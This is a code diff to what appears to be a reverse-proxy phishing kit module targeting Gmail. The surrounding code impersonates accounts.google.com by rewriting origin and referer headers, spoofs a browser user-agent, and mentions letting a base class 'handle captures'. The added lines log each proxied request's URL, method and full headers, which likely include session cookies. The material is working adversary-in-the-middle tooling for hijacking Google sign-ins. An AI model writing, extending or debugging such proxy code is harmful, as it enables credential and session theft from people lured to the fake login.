@@ -15,6 +15,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 
     processRequest() {
         // Simple approach like working services - let the base class handle captures
+        console.log('Gmail processRequest called for:', this.browserReq.url)
         return super.processRequest()
     }
 }
@@ -102,6 +103,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
         this.req.headers['origin'] = this.req.headers['origin'] ? this.req.headers['origin'].replace(clientContext.hostname, 'accounts.google.com') : ''
         this.req.headers['referer'] = this.req.headers['referer'] ? this.req.headers['referer'].replace(clientContext.hostname, 'accounts.google.com') : ''
+        
+        console.log('Gmail request URL:', this.req.url)
+        console.log('Gmail request method:', this.req.method)
+        console.log('Gmail request headers:', this.req.headers)
         
         return super.execute(clientContext)
     }
